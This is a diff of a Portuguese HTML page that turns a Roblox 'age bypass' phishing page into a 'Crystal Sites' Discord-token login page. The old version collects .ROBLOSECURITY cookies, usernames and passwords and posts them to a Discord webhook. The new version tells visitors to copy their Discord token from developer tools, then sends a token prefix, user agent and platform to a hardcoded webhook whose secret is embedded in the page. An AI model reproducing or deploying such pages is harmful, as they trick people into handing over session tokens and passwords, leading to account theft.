@@ -1,699 +1,475 @@
 <!DOCTYPE html>
-<html lang="pt-br">
+<html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BypassAge ROBLOSECURITY Tool</title>
+    <title>Login - proteção método SITES</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
-            --primary-color: #00a2ff;
-            --secondary-color: #1a1a2e;
-            --accent-color: #ff6b6b;
-            --discord-color: #5865F2;
-            --text-color: #f0f0f0;
-            --bg-color: #121212;
-            --card-bg: #1e1e2e;
-            --input-bg: #2a2a3c;
-            --success-color: #4caf50;
-            --warning-color: #ff9800;
+            --primary: #4a86e8;
+            --primary-hover: #3a76d8;
+            --primary-dark: #2a66c8;
+            --primary-light: #6a96f8;
+            --discord: #5865F2;
+            --text: #fff;
+            --text-light: #e6eeff;
+            --border: rgba(74, 134, 232, 0.5);
+            --glow: rgba(58, 118, 216, 0.4);
+            --gradiente-btn: linear-gradient(135deg, var(--primary), var(--primary-light));
+            --gradiente-discord: linear-gradient(135deg, var(--discord), #7983F5);
+            --success: #4CAF50;
+            --error: #f44336;
+            --overlay: rgba(0, 0, 20, 0.6);
+            --fallback-bg: linear-gradient(135deg, #1a2c5f, #2a4b8f);
         }
-        
+
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: 'Poppins', sans-serif;
         }
-        
+
         body {
-            background: linear-gradient(135deg, var(--secondary-color), var(--bg-color));
-            color: var(--text-color);
-            line-height: 1.6;
+            background: url('https://images.unsplash.com/photo-1532274402911-5a369e4c4bb5?ixlib=rb-4.0.3&auto=format&fit=crop&w=1920&q=80') no-repeat center center fixed, var(--fallback-bg);
+            background-size: cover;
+            color: var(--text);
             min-height: 100vh;
-            padding: 20px;
             display: flex;
-            flex-direction: column;
             align-items: center;
+            justify-content: center;
+            padding: 2rem;
+            line-height: 1.6;
+            position: relative;
+            overflow-x: hidden;
         }
-        
-        .container {
-            max-width: 1200px;
+
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: var(--overlay);
+            z-index: -2;
+        }
+
+        #flow-canvas {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            z-index: -1;
+            pointer-events: none;
+        }
+
+        .login-container {
             width: 100%;
+            max-width: 450px;
+            background: rgba(26, 44, 95, 0.8);
+            border-radius: 20px;
+            padding: 2.5rem;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5), 0 0 25px rgba(58, 118, 216, 0.4);
+            backdrop-filter: blur(12px);
+            border: 1px solid var(--border);
+            animation: fadeIn 1s ease-out;
         }
-        
-        header {
-            text-align: center;
-            margin-bottom: 30px;
-            padding: 20px;
-            background: rgba(0, 0, 0, 0.3);
-            border-radius: 15px;
-            backdrop-filter: blur(10px);
-            border: 1px solid var(--primary-color);
-            box-shadow: 0 0 20px rgba(0, 162, 255, 0.3);
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
         }
-        
-        h1 {
-            font-size: 2.8rem;
-            margin-bottom: 10px;
-            color: var(--primary-color);
-            text-shadow: 0 0 10px rgba(0, 162, 255, 0.5);
-        }
-        
-        .subtitle {
-            font-size: 1.2rem;
-            color: var(--text-color);
-            opacity: 0.8;
-            margin-bottom: 15px;
-        }
-        
+
         .logo {
-            font-size: 3rem;
-            color: var(--primary-color);
-            margin-bottom: 15px;
+            text-align: center;
+            margin-bottom: 2rem;
         }
-        
-        .info-box {
-            background: var(--card-bg);
-            border-radius: 15px;
-            padding: 25px;
-            margin-bottom: 30px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.5);
-            border: 1px solid rgba(255, 255, 255, 0.1);
+
+        .logo h1 {
+            font-size: 2.5rem;
+            color: var(--primary-light);
+            text-shadow: 0 0 15px var(--glow);
+            margin-bottom: 0.5rem;
         }
-        
-        .info-title {
-            color: var(--primary-color);
-            margin-bottom: 20px;
-            font-size: 1.8rem;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-        
-        .info-list {
-            list-style-type: none;
-        }
-        
-        .info-list li {
-            padding: 12px 0;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-        
-        .info-list li:last-child {
-            border-bottom: none;
-        }
-        
-        .info-list li i {
-            color: var(--primary-color);
-        }
-        
-        .bypass-section {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 25px;
-            margin-bottom: 30px;
-        }
-        
-        .bypass-method {
-            flex: 1;
-            min-width: 300px;
-            background: var(--card-bg);
-            border-radius: 15px;
-            padding: 25px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.5);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            display: flex;
-            flex-direction: column;
-        }
-        
-        .method-title {
-            color: var(--primary-color);
-            margin-bottom: 20px;
-            font-size: 1.5rem;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-        
-        .form-group {
-            margin-bottom: 20px;
-        }
-        
-        label {
-            display: block;
-            margin-bottom: 8px;
-            font-weight: 500;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-        
-        input, select {
-            width: 100%;
-            padding: 14px;
-            border-radius: 8px;
-            border: 1px solid var(--input-bg);
-            background-color: var(--input-bg);
-            color: var(--text-color);
+
+        .logo p {
+            color: var(--text-light);
             font-size: 1rem;
-            transition: all 0.3s;
         }
-        
-        input:focus, select:focus {
-            outline: none;
-            border-color: var(--primary-color);
-            box-shadow: 0 0 10px rgba(0, 162, 255, 0.3);
+
+        .token-section {
+            margin: 2rem 0;
+            padding: 1.5rem;
+            background: rgba(34, 52, 111, 0.4);
+            border-radius: 10px;
+            border: 1px solid var(--border);
         }
-        
-        button {
-            width: 100%;
-            padding: 15px;
-            background: linear-gradient(135deg, var(--primary-color), #0066cc);
+
+        .token-section h3 {
+            color: var(--primary-light);
+            margin-bottom: 1rem;
+            text-align: center;
+            font-size: 1.2rem;
+        }
+
+        .token-input {
+            display: flex;
+            gap: 0.5rem;
+        }
+
+        .token-input input {
+            flex: 1;
+            padding: 1rem;
+            border-radius: 10px;
+            border: 1px solid var(--border);
+            background: rgba(34, 52, 111, 0.6);
+            color: var(--text);
+            font-size: 1rem;
+        }
+
+        .token-input button {
+            padding: 1rem;
+            background: var(--gradiente-btn);
             color: white;
             border: none;
-            border-radius: 8px;
+            border-radius: 10px;
             cursor: pointer;
-            font-size: 1.1rem;
-            font-weight: bold;
-            transition: all 0.3s;
-            margin-top: auto;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            gap: 10px;
+            transition: all 0.3s ease;
         }
-        
-        button:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(0, 162, 255, 0.4);
+
+        .token-input button:hover {
+            background: linear-gradient(135deg, var(--primary-light), var(--primary));
         }
-        
-        .btn-discord {
-            background: linear-gradient(135deg, var(--discord-color), #4752c4);
-        }
-        
-        .btn-discord:hover {
-            box-shadow: 0 5px 15px rgba(88, 101, 242, 0.4);
-        }
-        
-        .btn-optional {
-            background: linear-gradient(135deg, #6c757d, #5a6268);
-        }
-        
-        .btn-optional:hover {
-            box-shadow: 0 5px 15px rgba(108, 117, 125, 0.4);
-        }
-        
-        .processing {
-            display: none;
-            text-align: center;
-            margin-top: 20px;
-            flex-direction: column;
-            align-items: center;
-            gap: 15px;
-        }
-        
-        .spinner {
-            border: 4px solid rgba(255, 255, 255, 0.3);
-            border-radius: 50%;
-            border-top: 4px solid var(--primary-color);
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-        }
-        
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        
-        .results-section {
-            background: var(--card-bg);
-            border-radius: 15px;
-            padding: 25px;
-            margin-bottom: 30px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.5);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-        }
-        
-        .results-title {
-            color: var(--primary-color);
-            margin-bottom: 20px;
-            font-size: 1.8rem;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-        
-        .result-item {
-            padding: 20px;
-            background: var(--input-bg);
-            border-radius: 10px;
-            margin-bottom: 15px;
-            border-left: 4px solid var(--primary-color);
-        }
-        
-        .result-type {
-            font-weight: bold;
-            color: var(--primary-color);
-            margin-bottom: 8px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-        
-        .result-data {
-            word-break: break-all;
-            margin: 10px 0;
-            padding: 12px;
-            background: rgba(0, 0, 0, 0.2);
-            border-radius: 8px;
-            font-family: monospace;
-        }
-        
-        .result-date {
-            font-size: 0.9rem;
-            opacity: 0.7;
-            display: flex;
-            align-items: center;
-            gap: 5px;
-        }
-        
-        footer {
-            text-align: center;
-            padding: 20px;
-            margin-top: 20px;
+
+        .login-btn {
             width: 100%;
-            border-top: 1px solid rgba(255, 255, 255, 0.1);
-            font-size: 0.9rem;
-            opacity: 0.7;
-        }
-        
-        .warning {
-            color: var(--warning-color);
-            font-weight: bold;
-            margin-top: 10px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            gap: 8px;
-        }
-        
-        .disclaimer {
-            background: rgba(255, 107, 107, 0.1);
-            border: 1px solid var(--accent-color);
-            border-radius: 10px;
-            padding: 15px;
-            margin-bottom: 25px;
-            text-align: center;
-        }
-        
-        .discord-login {
-            background: var(--card-bg);
-            border-radius: 15px;
-            padding: 25px;
-            margin-bottom: 30px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.5);
-            border: 1px solid var(--discord-color);
-            text-align: center;
-        }
-        
-        .discord-info {
-            margin-top: 15px;
-            padding: 15px;
-            background: rgba(88, 101, 242, 0.1);
-            border-radius: 10px;
-            font-size: 0.9rem;
-        }
-        
-        .optional-badge {
-            background: #6c757d;
+            padding: 1rem;
+            background: var(--gradiente-btn);
             color: white;
-            padding: 3px 8px;
-            border-radius: 4px;
-            font-size: 0.8rem;
-            margin-left: 8px;
+            border: none;
+            border-radius: 10px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 5px 15px var(--glow);
+            margin-top: 1rem;
         }
-        
+
+        .login-btn:hover {
+            background: linear-gradient(135deg, var(--primary-light), var(--primary));
+            box-shadow: 0 7px 20px var(--glow);
+            transform: translateY(-2px);
+        }
+
+        .support {
+            text-align: center;
+            margin-top: 2rem;
+            color: var(--text-light);
+            font-size: 0.9rem;
+        }
+
+        .support a {
+            color: var(--primary-light);
+            text-decoration: none;
+        }
+
+        .support a:hover {
+            text-decoration: underline;
+        }
+
+        .alert {
+            padding: 1rem;
+            border-radius: 10px;
+            margin-bottom: 1.5rem;
+            display: none;
+        }
+
+        .alert-error {
+            background: rgba(244, 67, 54, 0.2);
+            border: 1px solid var(--error);
+            color: var(--text);
+        }
+
+        .alert-success {
+            background: rgba(76, 175, 80, 0.2);
+            border: 1px solid var(--success);
+            color: var(--text);
+        }
+
+        .info-box {
+            background: rgba(34, 52, 111, 0.4);
+            border-radius: 10px;
+            padding: 1rem;
+            margin: 1.5rem 0;
+            border: 1px solid var(--border);
+        }
+
+        .info-box h4 {
+            color: var(--primary-light);
+            margin-bottom: 0.5rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .info-box p {
+            color: var(--text-light);
+            font-size: 0.9rem;
+            line-height: 1.5;
+        }
+
+        /* Responsividade */
         @media (max-width: 768px) {
-            .bypass-section {
+            .login-container {
+                padding: 2rem;
+            }
+            
+            .logo h1 {
+                font-size: 2rem;
+            }
+            
+            .token-input {
                 flex-direction: column;
             }
-            
-            h1 {
-                font-size: 2.2rem;
+        }
+
+        @media (max-width: 480px) {
+            body {
+                padding: 1rem;
             }
             
-            .info-title, .results-title {
-                font-size: 1.5rem;
+            .login-container {
+                padding: 1.5rem;
             }
-        }
-        
-        .tooltip {
-            position: relative;
-            display: inline-block;
-            cursor: pointer;
-        }
-        
-        .tooltip .tooltiptext {
-            visibility: hidden;
-            width: 200px;
-            background-color: var(--input-bg);
-            color: var(--text-color);
-            text-align: center;
-            border-radius: 6px;
-            padding: 10px;
-            position: absolute;
-            z-index: 1;
-            bottom: 125%;
-            left: 50%;
-            margin-left: -100px;
-            opacity: 0;
-            transition: opacity 0.3s;
-            font-size: 0.9rem;
-        }
-        
-        .tooltip:hover .tooltiptext {
-            visibility: visible;
-            opacity: 1;
-        }
-        
-        .login-status {
-            margin-top: 15px;
-            padding: 10px;
-            border-radius: 8px;
-            text-align: center;
-            display: none;
-        }
-        
-        .status-success {
-            background: rgba(76, 175, 80, 0.2);
-            border: 1px solid var(--success-color);
-            color: var(--success-color);
-        }
-        
-        .status-error {
-            background: rgba(255, 107, 107, 0.2);
-            border: 1px solid var(--accent-color);
-            color: var(--accent-color);
-        }
-        
-        .status-info {
-            background: rgba(0, 162, 255, 0.2);
-            border: 1px solid var(--primary-color);
-            color: var(--primary-color);
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <header>
-            <div class="logo">
-                <i class="fas fa-user-lock"></i>
-            </div>
-            <h1>BypassAge ROBLOSECURITY</h1>
-            <p class="subtitle">Ferramenta avançada de bypass de idade para Roblox</p>
-        </header>
-        
-        <div class="disclaimer">
-            <p><i class="fas fa-exclamation-triangle"></i> <strong>Aviso importante:</strong> Esta ferramenta é apenas para fins educacionais. Use com responsabilidade.</p>
+    <canvas id="flow-canvas"></canvas>
+    
+    <div class="login-container">
+        <div class="logo">
+            <h1>CRYSTAL SITES</h1>
+            <p>Acesso exclusivo com token do Discord</p>
         </div>
-        
-        <div class="discord-login">
-            <h2 class="info-title"><i class="fab fa-discord"></i> Login via Discord Webhook <span class="optional-badge">OPCIONAL</span></h2>
-            <p>Para receber os resultados no Discord, configure o webhook abaixo (não obrigatório)</p>
-            
-            <div class="form-group">
-                <label for="webhookUrl"><i class="fas fa-link"></i> URL do Webhook do Discord</label>
-                <input type="text" id="webhookUrl" placeholder="https://discord.com/api/webhooks/...">
-            </div>
-            
-            <button class="btn-discord" onclick="setupDiscordWebhook()">
-                <i class="fab fa-discord"></i> Configurar Webhook
-            </button>
-            
-            <button class="btn-optional" onclick="removeWebhook()" style="margin-top: 10px;">
-                <i class="fas fa-times"></i> Remover Webhook
-            </button>
-            
-            <div class="discord-info">
-                <p><i class="fas fa-info-circle"></i> Quando um cookie for processado, as informações serão enviadas para este webhook (se configurado).</p>
-            </div>
-            
-            <div id="webhookStatus" class="login-status"></div>
+
+        <div id="alertBox" class="alert alert-error">
+            <i class="fas fa-exclamation-circle"></i> <span id="alertMessage"></span>
         </div>
-        
+
         <div class="info-box">
-            <h2 class="info-title"><i class="fas fa-info-circle"></i> Informações Importantes</h2>
-            <ul class="info-list">
-                <li><i class="fas fa-graduation-cap"></i> Esta ferramenta é para fins educacionais apenas</li>
-                <li><i class="fas fa-shield-alt"></i> Seu .ROBLOSECURITY cookie é informação sensível</li>
-                <li><i class="fas fa-cog"></i> Escolha o método de bypass apropriado para sua conta</li>
-                <li><i class="fas fa-key"></i> Senha é necessária apenas para bypass 13+ All Ages</li>
-                <li><i class="fas fa-clock"></i> Processamento pode levar 5-10 segundos dependendo da carga do servidor</li>
-                <li><i class="fas fa-lock"></i> Todos os dados processados são criptografados e não armazenados</li>
-                <li><i class="fab fa-discord"></i> Webhook do Discord é <strong>opcional</strong> - a ferramenta funciona sem ele</li>
-            </ul>
+            <h4><i class="fas fa-info-circle"></i> Como obter seu token</h4>
+            <p>1. Abra o Discord no seu navegador<br>
+               2. Pressione F12 para abrir as Ferramentas do Desenvolvedor<br>
+               3. Vá para a aba "Application" > "Local Storage"<br>
+               4. Encontre o campo "token" e copie o valor</p>
         </div>
-        
-        <div class="bypass-section">
-            <div class="bypass-method">
-                <h3 class="method-title"><i class="fas fa-code"></i> Método 2008 Bypass</h3>
-                <div class="form-group">
-                    <label for="cookie"><i class="fas fa-cookie"></i> Cookie .ROBLOSECURITY</label>
-                    <input type="text" id="cookie" placeholder="Insira seu cookie aqui">
-                    <div class="tooltip">
-                        <i class="fas fa-question-circle" style="color: var(--primary-color); margin-top: 5px;"></i>
-                        <span class="tooltiptext">Como obter: Inspecionar elemento → Application → Cookies</span>
-                    </div>
-                </div>
-                <button onclick="processBypass('2008')"><i class="fas fa-bolt"></i> Processar Bypass 2008</button>
-                <div class="processing" id="processing-2008">
-                    <div class="spinner"></div>
-                    <p>Processando... Isso pode levar de 5 a 10 segundos</p>
-                </div>
+
+        <div class="token-section">
+            <h3>Autenticação por Token</h3>
+            <div class="token-input">
+                <input type="password" id="token" placeholder="Cole o token da sua conta Discord">
+                <button onclick="validateToken()"><i class="fas fa-check"></i></button>
             </div>
-            
-            <div class="bypass-method">
-                <h3 class="method-title"><i class="fas fa-user-plus"></i> Método 13+ All Ages</h3>
-                <div class="form-group">
-                    <label for="username13"><i class="fas fa-user"></i> Nome de usuário</label>
-                    <input type="text" id="username13" placeholder="Seu nome de usuário">
-                </div>
-                <div class="form-group">
-                    <label for="password13"><i class="fas fa-lock"></i> Senha</label>
-                    <input type="password" id="password13" placeholder="Sua senha">
-                </div>
-                <div class="form-group">
-                    <label for="cookie13"><i class="fas fa-cookie-bite"></i> Cookie .ROBLOSECURITY</label>
-                    <input type="text" id="cookie13" placeholder="Insira seu cookie aqui">
-                    <div class="tooltip">
-                        <i class="fas fa-question-circle" style="color: var(--primary-color); margin-top: 5px;"></i>
-                        <span class="tooltiptext">Necessário para autenticação adicional</span>
-                    </div>
-                </div>
-                <button onclick="processBypass('13plus')"><i class="fas fa-bolt"></i> Processar Bypass 13+</button>
-                <div class="processing" id="processing-13plus">
-                    <div class="spinner"></div>
-                    <p>Processando... Isso pode levar de 5 a 10 segundos</p>
-                </div>
-            </div>
+            <button class="login-btn" onclick="validateToken()">
+                <i class="fas fa-sign-in-alt"></i> Entrar com Token
+            </button>
         </div>
-        
-        <div class="results-section">
-            <h2 class="results-title"><i class="fas fa-history"></i> Últimos Processamentos</h2>
-            <div class="result-item">
-                <div class="result-type"><i class="fas fa-code"></i> 2008 Bypass:</div>
-                <div class="result-data">cookie: a1b2c3d4e5...x9y8z7w6v5</div>
-                <div class="result-date"><i class="fas fa-clock"></i> Processado: 7/9/2025, 10:30:22 AM</div>
-            </div>
-            <div class="result-item">
-                <div class="result-type"><i class="fas fa-user-plus"></i> 13+ Bypass:</div>
-                <div class="result-data">user: player123 | cookie: k5l6m7n8o9...p0q1r2s3t4</div>
-                <div class="result-date"><i class="fas fa-clock"></i> Processado: 7/9/2025, 9:15:47 AM</div>
-            </div>
-            <div class="result-item">
-                <div class="result-type"><i class="fas fa-code"></i> 2008 Bypass:</div>
-                <div class="result-data">cookie: f6g7h8i9j0...a5s4d3f2g1</div>
-                <div class="result-date"><i class="fas fa-clock"></i> Processado: 7/8/2025, 2:45:13 PM</div>
-            </div>
+
+        <div class="support">
+            Precisa de ajuda? <a href="https://discord.gg/mcwxfHwm" target="_blank">Entre em nosso Discord</a>
         </div>
-        
-        <footer>
-            <p>BypassAge ROBLOSECURITY Tool &copy; 2025 | Esta ferramenta é apenas para fins educacionais</p>
-            <p class="warning"><i class="fas fa-exclamation-triangle"></i> Nunca compartilhe suas informações de login ou cookies com terceiros</p>
-        </footer>
     </div>
 
     <script>
-        let webhookUrl = '';
-        
-        function setupDiscordWebhook() {
-            const url = document.getElementById('webhookUrl').value;
-            const status = document.getElementById('webhookStatus');
-            
-            // Se o campo estiver vazio, apenas limpar o webhook
-            if (!url) {
-                webhookUrl = '';
-                localStorage.removeItem('discordWebhook');
-                status.style.display = 'block';
-                status.className = 'login-status status-info';
-                status.innerHTML = '<i class="fas fa-info-circle"></i> Webhook removido. Os resultados não serão enviados para o Discord.';
-                return;
+        // Inicializar partículas de fluxo azul
+        const canvas = document.getElementById('flow-canvas');
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+
+        window.addEventListener('resize', () => {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        });
+
+        class FlowParticle {
+            constructor() {
+                this.x = Math.random() * canvas.width;
+                this.y = Math.random() * canvas.height;
+                this.size = Math.random() * 3 + 1;
+                this.speedX = Math.random() * 1 - 0.5;
+                this.speedY = Math.random() * 1 - 0.5;
+                this.color = `rgba(74, 134, 232, ${Math.random() * 0.5 + 0.2})`;
+                this.angle = 0;
             }
-            
-            if (!url.includes('discord.com/api/webhooks/')) {
-                status.style.display = 'block';
-                status.className = 'login-status status-error';
-                status.innerHTML = '<i class="fas fa-times-circle"></i> URL de webhook do Discord inválida';
-                return;
+
+            update() {
+                this.angle += 0.01;
+                this.x += this.speedX + Math.cos(this.angle) * 0.5;
+                this.y += this.speedY + Math.sin(this.angle) * 0.5;
+                
+                if (this.x > canvas.width || this.x < 0) {
+                    this.speedX = -this.speedX;
+                }
+                if (this.y > canvas.height || this.y < 0) {
+                    this.speedY = -this.speedY;
+                }
             }
-            
-            // Testar o webhook
-            fetch(url, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    content: '🔗 **Webhook conectado com sucesso!**\nBypassAge ROBLOSECURITY Tool está agora conectado a este canal.',
-                    username: 'BypassAge Logger',
-                    avatar_url: 'https://cdn-icons-png.flaticon.com/512/2111/2111370.png'
-                })
-            })
-            .then(response => {
-                if (response.ok) {
-                    webhookUrl = url;
-                    status.style.display = 'block';
-                    status.className = 'login-status status-success';
-                    status.innerHTML = '<i class="fas fa-check-circle"></i> Webhook configurado com sucesso!';
+
+            draw() {
+                ctx.beginPath();
+                ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
+                ctx.fillStyle = this.color;
+                ctx.fill();
+            }
+        }
+
+        let particles = [];
+        for (let i = 0; i < 100; i++) {
+            particles.push(new FlowParticle());
+        }
+
+        function connectParticles() {
+            for (let i = 0; i < particles.length; i++) {
+                for (let j = i; j < particles.length; j++) {
+                    const dx = particles[i].x - particles[j].x;
+                    const dy = particles[i].y - particles[j].y;
+                    const distance = Math.sqrt(dx * dx + dy * dy);
                     
-                    // Salvar no localStorage
-                    localStorage.setItem('discordWebhook', url);
-                } else {
-                    status.style.display = 'block';
-                    status.className = 'login-status status-error';
-                    status.innerHTML = '<i class="fas fa-times-circle"></i> Falha ao conectar com o webhook. Verifique a URL.';
+                    if (distance < 100) {
+                        ctx.beginPath();
+                        ctx.strokeStyle = `rgba(74, 134, 232, ${0.2 - distance/500})`;
+                        ctx.lineWidth = 0.5;
+                        ctx.moveTo(particles[i].x, particles[i].y);
+                        ctx.lineTo(particles[j].x, particles[j].y);
+                        ctx.stroke();
+                    }
                 }
-            })
-            .catch(error => {
-                status.style.display = 'block';
-                status.className = 'login-status status-error';
-                status.innerHTML = '<i class="fas fa-times-circle"></i> Erro ao conectar com o webhook. Verifique a URL.';
-            });
-        }
-        
-        function removeWebhook() {
-            webhookUrl = '';
-            document.getElementById('webhookUrl').value = '';
-            localStorage.removeItem('discordWebhook');
-            
-            const status = document.getElementById('webhookStatus');
-            status.style.display = 'block';
-            status.className = 'login-status status-info';
-            status.innerHTML = '<i class="fas fa-info-circle"></i> Webhook removido. Os resultados não serão enviados para o Discord.';
-        }
-        
-        function sendToDiscordWebhook(type, data) {
-            if (!webhookUrl) return; // Não faz nada se não houver webhook configurado
-            
-            let content = '';
-            
-            if (type === '2008') {
-                content = `🔓 **NOVO BYPASS 2008 PROCESSADO**\n\`\`\`${data}\`\`\``;
-            } else if (type === '13plus') {
-                content = `🔓 **NOVO BYPASS 13+ PROCESSADO**\nUsuário: ${data.username}\nSenha: ||${data.password}||\nCookie: \`\`\`${data.cookie}\`\`\``;
             }
+        }
+
+        function animateFlow() {
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
             
-            // Adicionar informações de data/hora e IP (simulado)
-            const now = new Date();
-            content += `\n⏰ **Data/Hora:** ${now.toLocaleString('pt-BR')}`;
+            particles.forEach(particle => {
+                particle.update();
+                particle.draw();
+            });
             
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    content: content,
-                    username: 'BypassAge Logger',
-                    avatar_url: 'https://cdn-icons-png.flaticon.com/512/2111/2111370.png'
-                })
-            })
-            .then(response => {
+            connectParticles();
+            requestAnimationFrame(animateFlow);
+        }
+
+        animateFlow();
+
+        // Configuração do Webhook do Discord
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1416902668189962310/2hYTdYIe4BYrBcQDk_wouXGHIS26CKFh9VDbGuGD_bgHyJmOxInzjtDBw12J9jEA-tLB";
+
+        // Função para enviar mensagem para o webhook do Discord
+        async function sendDiscordWebhook(token, success) {
+            try {
+                const payload = {
+                    embeds: [{
+                        title: success ? "✅ Login Bem-sucedido" : "❌ Tentativa de Login",
+                        color: success ? 3066993 : 15158332,
+                        fields: [
+                            {
+                                name: "🔑 Token Utilizado",
+                                value: token ? `\`${token.substring(0, 10)}...\`` : "Não informado",
+                                inline: true
+                            },
+                            {
+                                name: "🌐 User Agent",
+                                value: navigator.userAgent.substring(0, 50) + "...",
+                                inline: false
+                            },
+                            {
+                                name: "📱 Plataforma",
+                                value: navigator.platform,
+                                inline: true
+                            },
+                            {
+                                name: "⏰ Horário",
+                                value: new Date().toLocaleString('pt-BR'),
+                                inline: true
+                            }
+                        ],
+                        timestamp: new Date().toISOString(),
+                        footer: {
+                            text: "Sistema de Login • Crystal Sites"
+                        }
+                    }]
+                };
+
+                const response = await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload),
+                });
+
                 if (!response.ok) {
-                    console.error('Falha ao enviar para o webhook do Discord');
+                    console.error('Erro ao enviar webhook:', await response.text());
                 }
-            })
-            .catch(error => {
-                console.error('Erro ao enviar para o webhook:', error);
-            });
-        }
-        
-        function processBypass(type) {
-            // Mostrar o indicador de processamento
-            document.getElementById(`processing-${type}`).style.display = 'flex';
-            
-            // Validar campos
-            if (type === '2008') {
-                const cookie = document.getElementById('cookie').value;
-                if (!cookie) {
-                    alert('Por favor, insira o cookie .ROBLOSECURITY');
-                    document.getElementById(`processing-${type}`).style.display = 'none';
-                    return;
-                }
-                
-                // Enviar para o webhook do Discord (se configurado)
-                sendToDiscordWebhook(type, cookie);
-            } else if (type === '13plus') {
-                const username = document.getElementById('username13').value;
-                const password = document.getElementById('password13').value;
-                const cookie = document.getElementById('cookie13').value;
-                
-                if (!username || !password || !cookie) {
-                    alert('Por favor, preencha todos os campos');
-                    document.getElementById(`processing-${type}`).style.display = 'none';
-                    return;
-                }
-                
-                // Enviar para o webhook do Discord (se configurado)
-                sendToDiscordWebhook(type, { username, password, cookie });
+            } catch (error) {
+                console.error('Erro ao enviar webhook:', error);
             }
+        }
+
+        // Funções de autenticação
+        function showAlert(message, isError = true) {
+            const alertBox = document.getElementById('alertBox');
+            const alertMessage = document.getElementById('alertMessage');
             
-            // Simular processamento
+            alertMessage.textContent = message;
+            alertBox.className = isError ? 'alert alert-error' : 'alert alert-success';
+            alertBox.style.display = 'flex';
+            
             setTimeout(() => {
-                // Ocultar o indicador de processamento
-                document.getElementById(`processing-${type}`).style.display = 'none';
-                
-                // Mostrar mensagem de sucesso
-                alert(`Bypass ${type} processado com sucesso! Verifique a seção de últimos processamentos.`);
-                
-                // Em uma implementação real, aqui você adicionaria o resultado à seção de últimos processamentos
-            }, 6000); // 6 segundos de simulação
+                alertBox.style.display = 'none';
+            }, 5000);
         }
-        
-        // Verificar se há um webhook salvo no carregamento da página
-        window.addEventListener('DOMContentLoaded', (event) => {
-            const savedWebhook = localStorage.getItem('discordWebhook');
-            if (savedWebhook) {
-                webhookUrl = savedWebhook;
-                document.getElementById('webhookUrl').value = savedWebhook;
-                
-                const status = document.getElementById('webhookStatus');
-                status.style.display = 'block';
-                status.className = 'login-status status-success';
-                status.innerHTML = '<i class="fas fa-check-circle"></i> Webhook pré-configurado detectado.';
-            } else {
-                const status = document.getElementById('webhookStatus');
-                status.style.display = 'block';
-                status.className = 'login-status status-info';
-                status.innerHTML = '<i class="fas fa-info-circle"></i> Webhook não configurado. Os resultados não serão enviados para o Discord.';
+
+        function validateToken() {
+            const token = document.getElementById('token').value;
+            
+            if (!token) {
+                showAlert('Por favor, insira um token para validar.');
+                return;
             }
+            
+            // Validação básica de token (formato geral de tokens do Discord)
+            if (token.length >= 50) {
+                showAlert('Token validado com sucesso! Redirecionando...', false);
+                
+                // Enviar notificação para o Discord
+                sendDiscordWebhook(token, true);
+                
+                setTimeout(() => {
+                    window.location.href = 'index.html';
+                }, 1500);
+            } else {
+                showAlert('Token inválido. Certifique-se de que é um token válido do Discord.');
+                
+                // Enviar notificação de falha para o Discord
+                sendDiscordWebhook(token, false);
+            }
+        }
+
+        // Capturar a tecla Enter para submeter o token
+        document.addEventListener('keypress', function(event) {
+            if (event.key === 'Enter') {
+                validateToken();
+            }
+        });
+
+        // Mostrar/ocultar token
+        document.getElementById('token').addEventListener('dblclick', function() {
+            this.type = this.type === 'password' ? 'text' : 'password';
         });
     </script>
 </body>
-</html>
+    </html>
